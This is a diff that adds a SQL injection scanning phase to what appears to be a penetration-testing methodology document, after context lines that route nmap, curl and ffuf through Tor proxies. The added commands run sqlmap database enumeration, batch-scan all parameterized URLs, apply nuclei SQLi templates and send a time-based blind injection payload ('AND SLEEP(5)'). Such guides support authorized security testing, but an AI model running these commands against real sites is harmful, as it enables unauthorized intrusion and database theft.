@@ -420,3 +420,38 @@ curl --socks5-hostname 127.0.0.1:9050 https://target.com
 proxychains4 nmap -sT -Pn target.com
 proxychains4 ffuf -u https://target.com/FUZZ -w $WEB_WORDLIST
 ```
+
+### Phase 8 — SQL Injection Scanning
+
+Automated SQLi detection on parameterized URLs discovered during enumeration:
+
+```bash
+# Extract parameterized URLs for SQLi testing
+cat all_urls.txt | grep "=" | sort -u > parameterized_urls.txt
+
+# sqlmap on individual endpoints
+sqlmap -u "https://target.com/page.php?id=1" --dbs --banner --batch --random-agent
+
+# From saved Burp request file
+sqlmap -r request.txt --dbs --banner --batch
+
+# Batch scanning: test all parameterized URLs
+cat parameterized_urls.txt | while read url; do
+  sqlmap -u "$url" --batch --random-agent --level 1 --risk 1 \
+    --smart --answers="follow=N,skip=Y" 2>/dev/null \
+    | grep -q "is vulnerable" && echo "VULNERABLE: $url"
+done
+
+# nuclei SQLi templates
+nuclei -l parameterized_urls.txt \
+  -t nuclei-templates/http/vulnerabilities/sql-injection/ \
+  -severity critical,high \
+  -o nuclei_sqli.txt
+
+# Time-based blind SQLi detection (non-intrusive)
+cat parameterized_urls.txt | while read url; do
+  curl -sk --max-time 5 "$url' AND SLEEP(5)--" \
+    -w "%{time_total}s — $url" -o /dev/null
+  echo
+done | awk '$1 > 4.5 {print "SLOW: " $0}'
+```
